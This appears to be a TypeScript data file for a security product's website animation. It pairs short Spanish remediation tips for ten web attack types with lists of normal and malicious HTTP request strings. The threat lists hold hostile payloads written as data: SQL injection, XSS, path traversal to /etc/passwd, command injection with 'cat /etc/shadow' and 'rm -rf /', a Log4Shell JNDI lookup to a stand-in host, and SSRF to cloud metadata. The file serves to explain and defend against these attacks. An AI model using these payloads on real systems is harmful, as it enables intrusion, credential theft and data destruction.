export type AttackKind =
  | 'sqli'
  | 'xss'
  | 'traversal'
  | 'cmdi'
  | 'ssti'
  | 'log4shell'
  | 'ssrf'
  | 'nosqli'
  | 'proto'
  | 'jwt-none'

export interface Payload {
  text: string
  attack?: AttackKind
}

// `name` va en minúscula salvo siglas, porque se usa a mitad de frase.
export const ATTACKS: Record<AttackKind, { name: string; fix: string }> = {
  sqli: {
    name: 'inyección SQL',
    fix: 'Consultas parametrizadas: el dato nunca se concatena dentro del SQL.',
  },
  xss: {
    name: 'XSS',
    fix: 'Escapar la salida según el contexto y aplicar una CSP estricta.',
  },
  traversal: {
    name: 'path traversal',
    fix: 'Normalizar la ruta y servir solo archivos de una lista permitida.',
  },
  cmdi: {
    name: 'inyección de comandos',
    fix: 'No pasar texto del usuario a una shell; usar APIs con argumentos separados.',
  },
  ssti: {
    name: 'inyección de plantillas',
    fix: 'No compilar plantillas con texto del usuario; pasarlo solo como datos.',
  },
  log4shell: {
    name: 'Log4Shell',
    fix: 'Mantener las dependencias al día y no interpretar lookups dentro de los logs.',
  },
  ssrf: {
    name: 'SSRF',
    fix: 'Permitir solo destinos conocidos y bloquear la red interna y la metadata de la nube.',
  },
  nosqli: {
    name: 'inyección NoSQL',
    fix: 'Validar tipos con un esquema, por ejemplo con Zod, antes de consultar.',
  },
  proto: {
    name: 'prototype pollution',
    fix: 'Rechazar claves como __proto__ y usar objetos sin prototipo para mapas.',
  },
  'jwt-none': {
    name: 'JWT sin firma',
    fix: 'Fijar el algoritmo esperado al verificar y rechazar alg: none.',
  },
}

const legit = (text: string): Payload => ({ text })

export const LEGIT: Payload[] = [
  legit('GET /api/inventario?page=2'),
  legit('POST /auth/login'),
  legit('GET /reservas?mes=2026-10'),
  legit('PATCH /facturas/1043'),
  legit('GET /clientes?q=acme'),
  legit("GET /clientes?q=O'Higgins"),
  legit('PUT /equipos/88/estado'),
  legit('GET /health'),
  legit('POST /ordenes {"items":3}'),
  legit('GET /reportes/ventas.csv'),
  legit('GET /assets/app.4f2a.js'),
  legit('POST /webhooks/pagos'),
  legit('GET /usuarios/me'),
  legit('DELETE /sesiones/actual'),
  legit('GET /eventos/412/agenda'),
  legit('POST /auth/refresh'),
  legit('GET /bodegas/3/stock'),
  legit('GET /buscar?q=script de ventas'),
  legit('POST /perfil {"nombre":"Ana"}'),
]

export const THREATS: Payload[] = [
  { attack: 'sqli', text: "GET /productos?id=1' OR '1'='1" },
  { attack: 'sqli', text: "POST /login user=admin'--" },
  { attack: 'sqli', text: 'GET /items?orden=1;DROP TABLE users' },
  { attack: 'sqli', text: "GET /buscar?q=' UNION SELECT pass--" },
  { attack: 'xss', text: 'GET /buscar?q=<script>alert(1)</script>' },
  { attack: 'xss', text: 'POST /comentarios <img src=x onerror=…>' },
  { attack: 'xss', text: 'GET /perfil?n=<svg onload=fetch(…)>' },
  { attack: 'traversal', text: 'GET /archivos?f=../../etc/passwd' },
  { attack: 'traversal', text: 'GET /static/..%2f..%2f.env' },
  { attack: 'cmdi', text: 'POST /ping ip=1.1.1.1;cat /etc/shadow' },
  { attack: 'cmdi', text: 'GET /convertir?f=a.png|sh' },
  { attack: 'ssti', text: 'GET /saludo?n={{7*7}}' },
  { attack: 'ssti', text: 'GET /plantilla?t={{config.items()}}' },
  { attack: 'log4shell', text: 'User-Agent: ${jndi:ldap://x.io/a}' },
  { attack: 'ssrf', text: 'GET /preview?url=http://169.254.169.254' },
  { attack: 'ssrf', text: 'GET /fetch?u=http://localhost:6379' },
  { attack: 'nosqli', text: 'POST /login {"pass":{"$ne":null}}' },
  { attack: 'proto', text: 'POST /perfil {"__proto__":{"admin":1}}' },
  { attack: 'jwt-none', text: 'Authorization: JWT {"alg":"none"}' },
]

// Versiones cortas para la animación del hero, que tiene menos espacio.
export const WIRE_LEGIT: Payload[] = [
  legit('GET /api/inventario'),
  legit('POST /auth/login'),
  legit('GET /reservas/10'),
  legit('PATCH /facturas/43'),
  legit('GET /eventos/412'),
  legit('PUT /equipos/88'),
  legit('GET /health'),
  legit('POST /ordenes'),
]

export const WIRE_THREATS: Payload[] = [
  { attack: 'sqli', text: "GET /?id=1' OR 1=1" },
  { attack: 'xss', text: 'GET /?q=<script>' },
  { attack: 'traversal', text: 'GET /../etc/passwd' },
  { attack: 'log4shell', text: '${jndi:ldap://x}' },
  { attack: 'ssti', text: 'GET /?n={{7*7}}' },
  { attack: 'cmdi', text: 'POST /ping;rm -rf /' },
]
